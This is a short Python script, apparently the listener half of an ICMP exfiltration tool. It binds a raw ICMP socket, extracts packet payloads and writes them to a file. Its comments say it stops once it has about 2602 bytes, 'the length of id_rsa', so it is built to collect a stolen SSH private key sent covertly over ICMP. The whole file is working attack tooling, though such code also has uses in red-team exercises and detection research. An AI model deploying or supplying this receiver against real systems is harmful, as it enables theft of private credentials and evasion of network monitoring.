# Usage: python ./icmp_receiver.py
# Wait for your host to receive ICMP packets
# Program will automatically quit when it receives more than 2602 bytes (length of id_rsa)
# Adjust this number if you are receiving larger data sizes
# Note: You will need to run this script as sudo if you do not explicitly give raw socket privileges

import socket
import struct
import sys

# Define the listening IP address for ICMP (0.0.0.0 listens on all interfaces)
listen_ip = "0.0.0.0"

# Create a raw socket for ICMP packets
icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
icmp_socket.bind((listen_ip, 0))

try:
    print("ICMP Receiver is ready. Listening for incoming packets...")

    received_data = b""  # Initialize an empty byte string to store received data

    while True:
        # Receive ICMP packets
        packet_data, addr = icmp_socket.recvfrom(65536)  # Buffer size of 65536 bytes

        # Extract the data from the ICMP packet
        icmp_data = packet_data[28:]  # Skip the IP and ICMP headers

        # Append the received data to the byte string
        received_data += icmp_data

        # Check if the received data size matches the expected size
        if len(received_data) >= 2602:
            # Save the received data to a file
            with open("received_file.txt", "wb") as file:
                file.write(received_data)
                print("File received and saved as 'received_file.txt'")
            break  # Exit the loop after receiving the entire file (adjust as needed)
except KeyboardInterrupt:
    print("\nReceiver terminated.")
finally:
    icmp_socket.close()
